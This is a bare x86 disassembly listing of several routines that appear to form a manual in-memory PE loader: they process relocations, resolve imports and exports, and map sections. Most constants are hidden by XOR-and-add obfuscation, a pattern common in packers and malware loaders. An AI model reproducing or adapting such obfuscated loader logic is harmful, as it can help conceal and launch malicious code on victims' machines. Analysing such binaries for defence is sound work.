  42655a:	cmp    DWORD PTR [esi+0x34],edx
  42655d:	je     0x426634
  426563:	mov    esi,DWORD PTR [ecx+0x18c]
  426569:	and    DWORD PTR [ebp-0x10],0x0
  42656d:	mov    ecx,edx
  42656f:	sub    ecx,DWORD PTR [esi]
  426571:	add    eax,edx
  426573:	movzx  edx,WORD PTR [eax+0xc]
  426577:	mov    DWORD PTR [ebp-0x1c],ecx
  42657a:	movzx  ecx,WORD PTR [eax+0xe]
  42657e:	add    ecx,edx
  426580:	je     0x426634
  426586:	lea    ecx,[eax+0x14]
  426589:	push   ebx
  42658a:	mov    DWORD PTR [ebp-0x18],ecx
  42658d:	mov    esi,0x7fffffff
  426592:	push   edi
  426593:	test   DWORD PTR [ecx],esi
  426595:	je     0x426616
  426597:	mov    edx,DWORD PTR [ecx]
  426599:	and    DWORD PTR [ebp-0xc],0x0
  42659d:	and    edx,esi
  42659f:	add    edx,eax
  4265a1:	movzx  edi,WORD PTR [edx+0xe]
  4265a5:	movzx  ebx,WORD PTR [edx+0xc]
  4265a9:	add    edi,ebx
  4265ab:	je     0x426616
  4265ad:	lea    ecx,[edx+0x14]
  4265b0:	mov    DWORD PTR [ebp-0x14],ecx
  4265b3:	test   DWORD PTR [ecx],esi
  4265b5:	je     0x4265f8
  4265b7:	mov    ecx,DWORD PTR [ecx]
  4265b9:	and    DWORD PTR [ebp-0x8],0x0
  4265bd:	and    ecx,esi
  4265bf:	add    ecx,eax
  4265c1:	movzx  edi,WORD PTR [ecx+0xe]
  4265c5:	movzx  ebx,WORD PTR [ecx+0xc]
  4265c9:	add    edi,ebx
  4265cb:	je     0x4265f8
  4265cd:	lea    edi,[ecx+0x14]
  4265d0:	mov    DWORD PTR [ebp-0x4],edi
  4265d3:	mov    edi,DWORD PTR [ebp-0x4]
  4265d6:	mov    edi,DWORD PTR [edi]
  4265d8:	test   edi,edi
  4265da:	je     0x4265e2
  4265dc:	mov    ebx,DWORD PTR [ebp-0x1c]
  4265df:	add    DWORD PTR [edi+eax*1],ebx
  4265e2:	movzx  edi,WORD PTR [ecx+0xe]
  4265e6:	movzx  ebx,WORD PTR [ecx+0xc]
  4265ea:	inc    DWORD PTR [ebp-0x8]
  4265ed:	add    DWORD PTR [ebp-0x4],0x8
  4265f1:	add    edi,ebx
  4265f3:	cmp    DWORD PTR [ebp-0x8],edi
  4265f6:	jb     0x4265d3
  4265f8:	movzx  edi,WORD PTR [edx+0xe]
  4265fc:	movzx  ebx,WORD PTR [edx+0xc]
  426600:	mov    ecx,DWORD PTR [ebp-0x14]
  426603:	inc    DWORD PTR [ebp-0xc]
  426606:	add    ecx,0x8
  426609:	add    edi,ebx
  42660b:	mov    DWORD PTR [ebp-0x14],ecx
  42660e:	cmp    DWORD PTR [ebp-0xc],edi
  426611:	jb     0x4265b3
  426613:	mov    ecx,DWORD PTR [ebp-0x18]
  426616:	movzx  edx,WORD PTR [eax+0xe]
  42661a:	movzx  edi,WORD PTR [eax+0xc]
  42661e:	inc    DWORD PTR [ebp-0x10]
  426621:	add    ecx,0x8
  426624:	add    edx,edi
  426626:	mov    DWORD PTR [ebp-0x18],ecx
  426629:	cmp    DWORD PTR [ebp-0x10],edx
  42662c:	jb     0x426593
  426632:	pop    edi
  426633:	pop    ebx
  426634:	xor    eax,eax
  426636:	inc    eax
  426637:	jmp    0x42663b
  426639:	xor    eax,eax
  42663b:	pop    esi
  42663c:	leave  
  42663d:	ret    
  42663e:	push   ebp
  42663f:	mov    ebp,esp
  426641:	mov    ecx,DWORD PTR [ecx+0x190]
  426647:	mov    eax,DWORD PTR [ebp+0xc]
  42664a:	sub    esp,0x10
  42664d:	push   ebx
  42664e:	xor    ebx,ebx
  426650:	push   esi
  426651:	push   edi
  426652:	cmp    DWORD PTR [ecx],ebx
  426654:	je     0x4266dc
  42665a:	cmp    eax,ebx
  42665c:	je     0x4266dc
  42665e:	cmp    DWORD PTR [eax+0x78],ebx
  426661:	jne    0x426668
  426663:	xor    eax,eax
  426665:	inc    eax
  426666:	jmp    0x4266de
  426668:	mov    eax,DWORD PTR [eax+0x78]
  42666b:	add    eax,DWORD PTR [ebp+0x8]
  42666e:	mov    ecx,DWORD PTR [eax+0x1c]
  426671:	mov    edx,DWORD PTR [eax+0x24]
  426674:	mov    esi,DWORD PTR [eax+0x14]
  426677:	mov    edi,DWORD PTR [eax+0x18]
  42667a:	add    ecx,DWORD PTR [ebp+0x8]
  42667d:	add    edx,DWORD PTR [ebp+0x8]
  426680:	mov    DWORD PTR [ebp-0x4],esi
  426683:	cmp    esi,edi
  426685:	ja     0x42668a
  426687:	mov    DWORD PTR [ebp-0x4],edi
  42668a:	mov    DWORD PTR [ebp-0x8],ebx
  42668d:	cmp    DWORD PTR [ebp-0x4],ebx
  426690:	jbe    0x426663
  426692:	cmp    ebx,DWORD PTR [eax+0x14]
  426695:	jae    0x42669d
  426697:	movzx  esi,WORD PTR [edx+ebx*2]
  42669b:	jmp    0x42669f
  42669d:	mov    esi,ebx
  42669f:	lea    esi,[ecx+esi*4]
  4266a2:	mov    edi,DWORD PTR [esi]
  4266a4:	test   edi,edi
  4266a6:	je     0x4266d1
  4266a8:	add    edi,DWORD PTR [ebp+0x8]
  4266ab:	mov    DWORD PTR [ebp-0x10],edi
  4266ae:	cmp    edi,eax
  4266b0:	jbe    0x4266c2
  4266b2:	mov    ebx,DWORD PTR [ebp+0xc]
  4266b5:	mov    ebx,DWORD PTR [ebx+0x7c]
  4266b8:	add    ebx,eax
  4266ba:	cmp    edi,ebx
  4266bc:	jae    0x4266c2
  4266be:	mov    esi,DWORD PTR [esi]
  4266c0:	jmp    0x4266ca
  4266c2:	sub    edi,DWORD PTR [ebp+0x8]
  4266c5:	mov    DWORD PTR [esi],edi
  4266c7:	mov    esi,DWORD PTR [ebp-0x10]
  4266ca:	test   esi,esi
  4266cc:	je     0x4266dc
  4266ce:	mov    ebx,DWORD PTR [ebp-0x8]
  4266d1:	inc    ebx
  4266d2:	mov    DWORD PTR [ebp-0x8],ebx
  4266d5:	cmp    ebx,DWORD PTR [ebp-0x4]
  4266d8:	jb     0x426692
  4266da:	jmp    0x426663
  4266dc:	xor    eax,eax
  4266de:	pop    edi
  4266df:	pop    esi
  4266e0:	pop    ebx
  4266e1:	leave  
  4266e2:	ret    0x8
  4266e5:	push   ebp
  4266e6:	mov    ebp,esp
  4266e8:	sub    esp,0x2c
  4266eb:	mov    edx,0xf89c85b0
  4266f0:	mov    DWORD PTR [ebp-0x4],edx
  4266f3:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  4266fa:	mov    eax,DWORD PTR [ebp-0x4]
  4266fd:	mov    ecx,DWORD PTR [ebp-0x4]
  426700:	mov    ecx,DWORD PTR [ebp-0x4]
  426703:	mov    ecx,DWORD PTR [ebp-0x4]
  426706:	mov    ecx,DWORD PTR [ebp-0x4]
  426709:	mov    ecx,DWORD PTR [ebp-0x4]
  42670c:	push   ebx
  42670d:	mov    ebx,DWORD PTR [ebp+0x10]
  426710:	push   esi
  426711:	mov    esi,0x75108a4
  426716:	mov    DWORD PTR [ebp-0x10],0x352eb2e
  42671d:	mov    ecx,DWORD PTR [ebp-0x4]
  426720:	mov    ebx,DWORD PTR [ebx+0x190]
  426726:	push   edi
  426727:	mov    edi,0x3272ec
  42672c:	xor    ecx,esi
  42672e:	xor    eax,esi
  426730:	add    eax,edi
  426732:	add    ecx,edi
  426734:	mov    DWORD PTR [ebp-0x18],eax
  426737:	cmp    ecx,DWORD PTR [ebx]
  426739:	je     0x4269ba
  42673f:	mov    ebx,DWORD PTR [ebp-0x4]
  426742:	mov    ecx,DWORD PTR [ebp+0xc]
  426745:	xor    ebx,esi
  426747:	add    ebx,edi
  426749:	cmp    ebx,ecx
  42674b:	je     0x4269ba
  426751:	mov    ebx,DWORD PTR [ebp-0x4]
  426754:	mov    ecx,DWORD PTR [ecx+0x80]
  42675a:	xor    ebx,esi
  42675c:	add    ebx,edi
  42675e:	cmp    ecx,ebx
  426760:	je     0x4269b5
  426766:	add    ecx,DWORD PTR [ebp+0x8]
  426769:	mov    DWORD PTR [ebp-0x2c],ecx
  42676c:	mov    ebx,edx
  42676e:	xor    ebx,esi
  426770:	add    ebx,edi
  426772:	mov    DWORD PTR [ebp-0x10],ebx
  426775:	mov    ebx,DWORD PTR [ebp-0x10]
  426778:	cmp    ebx,edx
  42677a:	je     0x42678e
  42677c:	mov    edx,DWORD PTR [ebp-0x10]
  42677f:	mov    ebx,DWORD PTR [ebp-0x4]
  426782:	imul   edx,edx,0x14
  426785:	xor    ebx,esi
  426787:	add    ebx,edi
  426789:	cmp    DWORD PTR [edx+ecx*1],ebx
  42678c:	jne    0x4267a5
  42678e:	mov    edx,DWORD PTR [ebp-0x10]
  426791:	mov    ebx,DWORD PTR [ebp-0x4]
  426794:	imul   edx,edx,0x14
  426797:	xor    ebx,esi
  426799:	add    ebx,edi
  42679b:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  42679f:	je     0x4269a7
  4267a5:	mov    eax,DWORD PTR [ebp-0x4]
  4267a8:	mov    ebx,DWORD PTR [ebp-0x4]
  4267ab:	mov    eax,DWORD PTR [ebp-0x10]
  4267ae:	imul   eax,eax,0x14
  4267b1:	add    eax,ecx
  4267b3:	mov    ecx,DWORD PTR [eax+0x10]
  4267b6:	add    ecx,DWORD PTR [ebp+0x8]
  4267b9:	xor    ebx,esi
  4267bb:	mov    DWORD PTR [ebp-0x1c],ecx
  4267be:	mov    ecx,DWORD PTR [ebp-0x4]
  4267c1:	mov    edx,DWORD PTR [ebp-0x4]
  4267c4:	xor    ecx,esi
  4267c6:	add    ecx,edi
  4267c8:	xor    edx,esi
  4267ca:	mov    DWORD PTR [ebp-0x24],ecx
  4267cd:	mov    ecx,DWORD PTR [eax]
  4267cf:	add    edx,edi
  4267d1:	add    ebx,edi
  4267d3:	cmp    ecx,edx
  4267d5:	je     0x4267dd
  4267d7:	add    ecx,DWORD PTR [ebp+0x8]
  4267da:	mov    DWORD PTR [ebp-0x24],ecx
  4267dd:	mov    ecx,DWORD PTR [ebp-0x4]
  4267e0:	xor    ecx,esi
  4267e2:	add    ecx,DWORD PTR [eax+0xc]
  4267e5:	mov    eax,DWORD PTR [ebp+0x8]
  4267e8:	lea    eax,[ecx+eax*1+0x3272ec]
  4267ef:	mov    DWORD PTR [ebp+0xc],eax
  4267f2:	mov    DWORD PTR [ebp-0x28],0xf89c85bd
  4267f9:	mov    eax,DWORD PTR [ebp+0x10]
  4267fc:	push   DWORD PTR [ebp+0xc]
  4267ff:	mov    eax,DWORD PTR [eax+0x1d8]
  426805:	call   DWORD PTR [eax]
  426807:	mov    ecx,DWORD PTR [ebp-0x4]
  42680a:	xor    ecx,esi
  42680c:	add    ecx,edi
  42680e:	mov    DWORD PTR [ebp-0xc],eax
  426811:	cmp    ecx,eax
  426813:	jne    0x426827
  426815:	mov    eax,DWORD PTR [ebp+0x10]
  426818:	push   DWORD PTR [ebp+0xc]
  42681b:	mov    eax,DWORD PTR [eax+0x1d8]
  426821:	call   DWORD PTR [eax+0xc]
  426824:	mov    DWORD PTR [ebp-0xc],eax
  426827:	mov    DWORD PTR [ebp-0x20],0x7f661b29
  42682e:	mov    DWORD PTR [ebp-0x20],0xf89c9859
  426835:	mov    eax,DWORD PTR [ebp-0x4]
  426838:	xor    eax,esi
  42683a:	add    eax,edi
  42683c:	cmp    eax,DWORD PTR [ebp-0xc]
  42683f:	jne    0x426864
  426841:	mov    eax,DWORD PTR [ebp-0x8]
  426844:	mov    ecx,DWORD PTR [ebp-0x20]
  426847:	xor    eax,esi
  426849:	xor    ecx,esi
  42684b:	lea    ebx,[ebx+eax*1+0x3272ec]
  426852:	mov    eax,DWORD PTR [ebp+0x10]
  426855:	mov    eax,DWORD PTR [eax+0x1d8]
  42685b:	add    ecx,edi
  42685d:	imul   ecx,ebx
  426860:	push   ecx
  426861:	call   DWORD PTR [eax+0x24]
  426864:	mov    eax,DWORD PTR [ebp-0x4]
  426867:	xor    eax,esi
  426869:	add    eax,edi
  42686b:	cmp    eax,DWORD PTR [ebp-0xc]
  42686e:	jne    0x42687f
  426870:	mov    eax,DWORD PTR [ebp-0x28]
  426873:	xor    eax,esi
  426875:	add    eax,edi
  426877:	cmp    ebx,eax
  426879:	jbe    0x4267f9
  42687f:	mov    eax,DWORD PTR [ebp-0x4]
  426882:	xor    eax,esi
  426884:	add    eax,edi
  426886:	cmp    eax,DWORD PTR [ebp-0xc]
  426889:	jne    0x4268a2
  42688b:	mov    eax,DWORD PTR [ebp-0x8]
  42688e:	mov    ecx,DWORD PTR [ebp-0x18]
  426891:	xor    eax,esi
  426893:	lea    eax,[ecx+eax*1+0x3272ec]
  42689a:	mov    DWORD PTR [ebp-0x18],eax
  42689d:	jmp    0x426991
  4268a2:	mov    DWORD PTR [ebp-0x14],0x1121b28
  4268a9:	mov    DWORD PTR [ebp+0xc],0xe042d2e
  4268b0:	mov    ebx,DWORD PTR [ebp-0x4]
  4268b3:	xor    ebx,esi
  4268b5:	add    ebx,edi
  4268b7:	jmp    0x42697e
  4268bc:	mov    eax,DWORD PTR [ebp-0x4]
  4268bf:	xor    eax,esi
  4268c1:	add    eax,edi
  4268c3:	mov    DWORD PTR [ebp-0x14],eax
  4268c6:	mov    eax,DWORD PTR [ebp-0x4]
  4268c9:	xor    eax,esi
  4268cb:	add    eax,edi
  4268cd:	mov    DWORD PTR [ebp+0xc],eax
  4268d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4268d3:	mov    eax,DWORD PTR [ebp-0x24]
  4268d6:	xor    ecx,esi
  4268d8:	add    ecx,edi
  4268da:	cmp    ecx,eax
  4268dc:	je     0x4268e4
  4268de:	mov    eax,DWORD PTR [eax+ebx*4]
  4268e1:	mov    DWORD PTR [ebp-0x14],eax
  4268e4:	mov    eax,DWORD PTR [ebp-0x1c]
  4268e7:	mov    eax,DWORD PTR [eax+ebx*4]
  4268ea:	mov    DWORD PTR [ebp+0xc],eax
  4268ed:	mov    eax,DWORD PTR [ebp-0x4]
  4268f0:	mov    ecx,DWORD PTR [ebp-0x14]
  4268f3:	xor    eax,esi
  4268f5:	add    eax,edi
  4268f7:	cmp    eax,ecx
  4268f9:	je     0x426924
  4268fb:	mov    eax,DWORD PTR [ebp-0x4]
  4268fe:	mov    ecx,DWORD PTR [ebp-0x14]
  426901:	xor    eax,esi
  426903:	add    eax,edi
  426905:	shr    ecx,0x1f
  426908:	cmp    eax,ecx
  42690a:	je     0x426924
  42690c:	mov    ecx,DWORD PTR [ebp-0x14]
  42690f:	mov    eax,DWORD PTR [ebp+0x10]
  426912:	mov    eax,DWORD PTR [eax+0x1d8]
  426918:	movzx  ecx,cx
  42691b:	push   ecx
  42691c:	push   DWORD PTR [ebp-0xc]
  42691f:	call   DWORD PTR [eax+0x8]
  426922:	jmp    0x42693d
  426924:	mov    eax,DWORD PTR [ebp+0xc]
  426927:	add    eax,DWORD PTR [ebp+0x8]
  42692a:	mov    ecx,DWORD PTR [ebp+0x10]
  42692d:	mov    ecx,DWORD PTR [ecx+0x1d8]
  426933:	add    eax,0x2
  426936:	push   eax
  426937:	push   DWORD PTR [ebp-0xc]
  42693a:	call   DWORD PTR [ecx+0x8]
  42693d:	mov    DWORD PTR [ebp+0xc],eax
  426940:	mov    eax,DWORD PTR [ebp-0x4]
  426943:	mov    ecx,DWORD PTR [ebp+0xc]
  426946:	xor    eax,esi
  426948:	add    eax,edi
  42694a:	cmp    eax,ecx
  42694c:	mov    eax,DWORD PTR [ebp-0x8]
  42694f:	jne    0x426962
  426951:	mov    ecx,DWORD PTR [ebp-0x18]
  426954:	xor    eax,esi
  426956:	lea    eax,[ecx+eax*1+0x3272ec]
  42695d:	mov    DWORD PTR [ebp-0x18],eax
  426960:	jmp    0x426972
  426962:	mov    ecx,DWORD PTR [ebp+0xc]
  426965:	xor    eax,esi
  426967:	add    eax,edi
  426969:	imul   eax,ecx
  42696c:	mov    ecx,DWORD PTR [ebp-0x1c]
  42696f:	mov    DWORD PTR [ecx+ebx*4],eax
  426972:	mov    eax,DWORD PTR [ebp-0x8]
  426975:	xor    eax,esi
  426977:	lea    ebx,[ebx+eax*1+0x3272ec]
  42697e:	mov    eax,DWORD PTR [ebp-0x4]
  426981:	mov    ecx,DWORD PTR [ebp-0x1c]
  426984:	xor    eax,esi
  426986:	add    eax,edi
  426988:	cmp    DWORD PTR [ecx+ebx*4],eax
  42698b:	jne    0x4268bc
  426991:	mov    edx,DWORD PTR [ebp-0x10]
  426994:	mov    ecx,DWORD PTR [ebp-0x2c]
  426997:	mov    eax,DWORD PTR [ebp-0x18]
  42699a:	sub    edx,0x3272eb
  4269a0:	xor    edx,esi
  4269a2:	jmp    0x42676c
  4269a7:	mov    ecx,DWORD PTR [ebp-0x4]
  4269aa:	xor    ecx,esi
  4269ac:	add    ecx,edi
  4269ae:	cmp    eax,ecx
  4269b0:	mov    eax,DWORD PTR [ebp-0x4]
  4269b3:	jne    0x4269bd
  4269b5:	mov    eax,DWORD PTR [ebp-0x8]
  4269b8:	jmp    0x4269bd
  4269ba:	mov    eax,DWORD PTR [ebp-0x4]
  4269bd:	xor    eax,esi
  4269bf:	add    eax,edi
  4269c1:	pop    edi
  4269c2:	pop    esi
  4269c3:	pop    ebx
  4269c4:	leave  
  4269c5:	ret    0xc
  4269c8:	push   ebp
  4269c9:	mov    ebp,esp
  4269cb:	sub    esp,0x28
  4269ce:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  4269d5:	mov    DWORD PTR [ebp-0x28],0xf89c85b1
  4269dc:	mov    eax,DWORD PTR [ebp+0xc]
  4269df:	mov    DWORD PTR [ebp+0xc],eax
  4269e2:	push   esi
  4269e3:	mov    eax,eax
  4269e5:	mov    eax,DWORD PTR [ebp-0x4]
  4269e8:	mov    esi,DWORD PTR [ebp+0x8]
  4269eb:	mov    ecx,0x75108a4
  4269f0:	xor    eax,ecx
  4269f2:	mov    edx,0x3272ec
  4269f7:	add    eax,edx
  4269f9:	cmp    esi,eax
  4269fb:	je     0x426b22
  426a01:	mov    eax,DWORD PTR [ebp+0x8]
  426a04:	mov    esi,DWORD PTR [ebp+0x8]
  426a07:	add    esi,DWORD PTR [eax+0x3c]
  426a0a:	push   edi
  426a0b:	mov    DWORD PTR [ebp+0xc],esi
  426a0e:	mov    DWORD PTR [ebp-0x1c],0xf89c85bd
  426a15:	mov    eax,DWORD PTR [ebp-0x1c]
  426a18:	mov    esi,DWORD PTR [ebp-0x4]
  426a1b:	mov    edi,DWORD PTR [ebp+0xc]
  426a1e:	xor    esi,ecx
  426a20:	xor    eax,ecx
  426a22:	add    esi,edx
  426a24:	cmp    DWORD PTR [edi+eax*8+0x19397d8],esi
  426a2b:	je     0x426b1c
  426a31:	mov    esi,DWORD PTR [ebp+0xc]
  426a34:	mov    eax,DWORD PTR [ebp+0x8]
  426a37:	add    eax,DWORD PTR [esi+0xa0]
  426a3d:	mov    esi,DWORD PTR [ebp+0x8]
  426a40:	mov    edi,DWORD PTR [ebp+0xc]
  426a43:	sub    esi,DWORD PTR [edi+0x34]
  426a46:	mov    edi,DWORD PTR [ebp-0x4]
  426a49:	xor    edi,ecx
  426a4b:	add    edi,edx
  426a4d:	mov    DWORD PTR [ebp-0x24],esi
  426a50:	cmp    esi,edi
  426a52:	je     0x426b1c
  426a58:	mov    esi,DWORD PTR [ebp-0x4]
  426a5b:	xor    esi,ecx
  426a5d:	add    esi,edx
  426a5f:	mov    DWORD PTR [ebp-0x8],esi
  426a62:	push   ebx
  426a63:	mov    DWORD PTR [ebp-0x10],0xf89c85b3
  426a6a:	jmp    0x426b06
  426a6f:	mov    esi,DWORD PTR [ebp-0x4]
  426a72:	xor    esi,ecx
  426a74:	lea    edi,[ebx-0x8]
  426a77:	add    esi,edx
  426a79:	shr    edi,1
  426a7b:	cmp    esi,edi
  426a7d:	jae    0x426aec
  426a7f:	sub    edi,esi
  426a81:	lea    ebx,[eax+esi*2+0x8]
  426a85:	mov    DWORD PTR [ebp-0x18],edi
  426a88:	movzx  esi,WORD PTR [ebx]
  426a8b:	and    esi,0xfff
  426a91:	mov    DWORD PTR [ebp-0x14],esi
  426a94:	mov    edi,DWORD PTR [ebp-0x14]
  426a97:	mov    esi,DWORD PTR [eax]
  426a99:	sub    esi,edx
  426a9b:	add    edi,esi
  426a9d:	movzx  esi,WORD PTR [ebx]
  426aa0:	shr    esi,0xc
  426aa3:	xor    edi,ecx
  426aa5:	mov    DWORD PTR [ebp-0x20],edi
  426aa8:	mov    DWORD PTR [ebp-0x14],esi
  426aab:	mov    esi,DWORD PTR [ebp-0x20]
  426aae:	mov    edi,DWORD PTR [ebp+0x8]
  426ab1:	xor    esi,ecx
  426ab3:	lea    esi,[esi+edi*1+0x3272ec]
  426aba:	mov    DWORD PTR [ebp-0x20],esi
  426abd:	mov    esi,DWORD PTR [ebp-0x10]
  426ac0:	mov    edi,DWORD PTR [ebp-0x14]
  426ac3:	xor    esi,ecx
  426ac5:	add    esi,edx
  426ac7:	cmp    edi,esi
  426ac9:	jne    0x426ae1
  426acb:	mov    esi,DWORD PTR [ebp-0x10]
  426ace:	mov    edi,DWORD PTR [ebp-0x14]
  426ad1:	xor    esi,ecx
  426ad3:	add    esi,edx
  426ad5:	cmp    edi,esi
  426ad7:	jne    0x426ae1
  426ad9:	mov    esi,DWORD PTR [ebp-0x20]
  426adc:	mov    edi,DWORD PTR [ebp-0x24]
  426adf:	add    DWORD PTR [esi],edi
  426ae1:	add    ebx,0x2
  426ae4:	dec    DWORD PTR [ebp-0x18]
  426ae7:	jne    0x426a88
  426ae9:	mov    ebx,DWORD PTR [ebp-0xc]
  426aec:	add    DWORD PTR [ebp-0x8],ebx
  426aef:	mov    esi,DWORD PTR [ebp-0x1c]
  426af2:	mov    edi,DWORD PTR [ebp-0x8]
  426af5:	mov    ebx,DWORD PTR [ebp+0xc]
  426af8:	xor    esi,ecx
  426afa:	cmp    edi,DWORD PTR [ebx+esi*8+0x19397dc]
  426b01:	jae    0x426b1b
  426b03:	add    eax,DWORD PTR [ebp-0xc]
  426b06:	mov    esi,DWORD PTR [ebp-0x4]
  426b09:	mov    ebx,DWORD PTR [eax+0x4]
  426b0c:	xor    esi,ecx
  426b0e:	add    esi,edx
  426b10:	mov    DWORD PTR [ebp-0xc],ebx
  426b13:	cmp    ebx,esi
  426b15:	jne    0x426a6f
  426b1b:	pop    ebx
  426b1c:	mov    eax,DWORD PTR [ebp-0x28]
  426b1f:	pop    edi
  426b20:	jmp    0x426b25
  426b22:	mov    eax,DWORD PTR [ebp-0x4]
  426b25:	xor    eax,ecx
  426b27:	add    eax,edx
  426b29:	pop    esi
  426b2a:	leave  
  426b2b:	ret    0x8
  426b2e:	push   ebp
  426b2f:	mov    ebp,esp
  426b31:	sub    esp,0xd8
  426b37:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  426b3e:	mov    DWORD PTR [ebp-0x24],0xf89c85b1
  426b45:	mov    eax,DWORD PTR [ebp-0x4]
  426b48:	push   ebx
  426b49:	push   esi
  426b4a:	mov    esi,0x75108a4
  426b4f:	xor    eax,esi
  426b51:	push   edi
  426b52:	mov    edi,0x3272ec
  426b57:	add    eax,edi
  426b59:	mov    DWORD PTR [ebp-0x18],eax
  426b5c:	mov    eax,DWORD PTR [ebp-0x4]
  426b5f:	xor    eax,esi
  426b61:	add    eax,edi
  426b63:	mov    DWORD PTR [ebp-0x8],eax
  426b66:	mov    ebx,DWORD PTR [ebp+0x20]
  426b69:	mov    eax,DWORD PTR [ebp-0x1c]
  426b6c:	mov    ecx,DWORD PTR [ebp-0x1c]
  426b6f:	xor    eax,ecx
  426b71:	mov    DWORD PTR [ebp-0x1c],eax
  426b74:	add    DWORD PTR [ebp-0x1c],0xf89cb5b0
  426b7b:	mov    eax,DWORD PTR [ebp-0xc]
  426b7e:	mov    ecx,DWORD PTR [ebp-0xc]
  426b81:	xor    eax,ecx
  426b83:	mov    DWORD PTR [ebp-0xc],eax
  426b86:	add    DWORD PTR [ebp-0xc],0xf89c85f0
  426b8d:	mov    eax,DWORD PTR [ebp-0x10]
  426b90:	mov    ecx,DWORD PTR [ebp-0x10]
  426b93:	xor    eax,ecx
  426b95:	mov    DWORD PTR [ebp-0x10],eax
  426b98:	add    DWORD PTR [ebp-0x10],0xf89c85bc
  426b9f:	mov    eax,DWORD PTR [ebp-0x28]
  426ba2:	mov    ecx,DWORD PTR [ebp-0x28]
  426ba5:	xor    eax,ecx
  426ba7:	mov    DWORD PTR [ebp-0x28],eax
  426baa:	add    DWORD PTR [ebp-0x28],0xf89f05b0
  426bb1:	mov    DWORD PTR [ebp+0x20],0xf89cefc5
  426bb8:	mov    eax,DWORD PTR [ebp+0x8]
  426bbb:	test   eax,eax
  426bbd:	je     0x427048
  426bc3:	mov    eax,DWORD PTR [ebp+0xc]
  426bc6:	test   eax,eax
  426bc8:	je     0x427048
  426bce:	mov    eax,DWORD PTR [ebp+0x18]
  426bd1:	test   eax,eax
  426bd3:	je     0x427048
  426bd9:	mov    eax,DWORD PTR [ebp+0x20]
  426bdc:	mov    ecx,DWORD PTR [ebp+0x8]
  426bdf:	xor    eax,0x8a4
  426be4:	add    eax,0x72ec
  426be9:	cmp    WORD PTR [ecx],ax
  426bec:	jne    0x427048
  426bf2:	mov    eax,DWORD PTR [ebp-0x4]
  426bf5:	xor    eax,esi
  426bf7:	add    eax,edi
  426bf9:	mov    DWORD PTR [ebp-0x30],eax
  426bfc:	mov    eax,DWORD PTR [ebp-0x4]
  426bff:	mov    ecx,DWORD PTR [ebp+0x8]
  426c02:	mov    eax,DWORD PTR [ebp+0x8]
  426c05:	add    eax,DWORD PTR [ecx+0x3c]
  426c08:	mov    DWORD PTR [ebp+0xc],eax
  426c0b:	mov    eax,DWORD PTR [eax+0x50]
  426c0e:	test   eax,eax
  426c10:	je     0x427048
  426c16:	mov    DWORD PTR [ebp-0x2c],0xf88c85b0
  426c1d:	mov    eax,DWORD PTR [ebp-0x2c]
  426c20:	xor    eax,esi
  426c22:	add    eax,edi
  426c24:	mov    DWORD PTR [ebp-0x2c],eax
  426c27:	mov    eax,DWORD PTR [ebp-0x4]
  426c2a:	mov    eax,DWORD PTR [ebx+0x190]
  426c30:	mov    ecx,DWORD PTR [eax]
  426c32:	mov    ecx,DWORD PTR [ecx+0x3c]
  426c35:	add    ecx,DWORD PTR [eax]
  426c37:	mov    eax,DWORD PTR [ebp-0x4]
  426c3a:	mov    eax,DWORD PTR [ebx+0x18c]
  426c40:	mov    edx,DWORD PTR [eax]
  426c42:	mov    DWORD PTR [ebp-0x20],ecx
  426c45:	mov    DWORD PTR [ebp+0x20],edx
  426c48:	cmp    edx,edx
  426c4a:	jne    0x426c7e
  426c4c:	mov    eax,DWORD PTR [ebx+0x1d8]
  426c52:	lea    edx,[ebp-0x18]
  426c55:	push   edx
  426c56:	mov    edx,DWORD PTR [ebp-0xc]
  426c59:	xor    edx,esi
  426c5b:	add    edx,edi
  426c5d:	push   edx
  426c5e:	push   DWORD PTR [ecx+0x50]
  426c61:	push   DWORD PTR [ebp+0x20]
  426c64:	call   DWORD PTR [eax+0x1c]
  426c67:	mov    eax,DWORD PTR [ebp-0x20]
  426c6a:	mov    ecx,DWORD PTR [eax+0x54]
  426c6d:	mov    eax,DWORD PTR [eax+0x50]
  426c70:	sub    eax,ecx
  426c72:	add    ecx,DWORD PTR [ebp+0x20]
  426c75:	push   ecx
  426c76:	call   0x4275e5
  426c7b:	mov    edx,DWORD PTR [ebp+0x20]
  426c7e:	mov    eax,DWORD PTR [ebx+0x194]
  426c84:	mov    DWORD PTR [eax],edx
  426c86:	mov    eax,DWORD PTR [ebp+0xc]
  426c89:	push   DWORD PTR [eax+0x54]
  426c8c:	push   DWORD PTR [ebp+0x8]
  426c8f:	push   edx
  426c90:	call   0x4274db
  426c95:	mov    ecx,DWORD PTR [ebp+0x20]
  426c98:	mov    eax,DWORD PTR [ecx+0x3c]
  426c9b:	add    eax,ecx
  426c9d:	movzx  ecx,WORD PTR [eax+0x14]
  426ca1:	lea    ecx,[ecx+eax*1+0x18]
  426ca5:	mov    DWORD PTR [ebp+0x18],ecx
  426ca8:	mov    ecx,DWORD PTR [ebp-0x4]
  426cab:	movzx  edx,WORD PTR [eax+0x6]
  426caf:	xor    ecx,esi
  426cb1:	add    ecx,edi
  426cb3:	mov    DWORD PTR [ebp+0xc],eax
  426cb6:	cmp    edx,ecx
  426cb8:	je     0x426d65
  426cbe:	mov    ecx,DWORD PTR [ebp-0x4]
  426cc1:	xor    ecx,esi
  426cc3:	add    ecx,edi
  426cc5:	mov    DWORD PTR [ebp-0x8],ecx
  426cc8:	mov    ecx,DWORD PTR [ebp-0x24]
  426ccb:	movzx  edx,WORD PTR [eax+0x6]
  426ccf:	xor    ecx,esi
  426cd1:	sub    edx,ecx
  426cd3:	sub    edx,edi
  426cd5:	cmp    DWORD PTR [ebp-0x8],edx
  426cd8:	ja     0x426d65
  426cde:	mov    edx,DWORD PTR [ebp+0x18]
  426ce1:	add    edx,0x8
  426ce4:	mov    DWORD PTR [ebp+0x18],edx
  426ce7:	jmp    0x426cec
  426ce9:	mov    edx,DWORD PTR [ebp+0x18]
  426cec:	mov    eax,DWORD PTR [eax+0x38]
  426cef:	lea    ecx,[eax-0x1]
  426cf2:	mov    DWORD PTR [ebp-0x38],eax
  426cf5:	mov    eax,DWORD PTR [edx]
  426cf7:	test   eax,ecx
  426cf9:	je     0x426d02
  426cfb:	not    ecx
  426cfd:	and    eax,ecx
  426cff:	add    eax,DWORD PTR [ebp-0x38]
  426d02:	mov    ecx,DWORD PTR [edx+0x4]
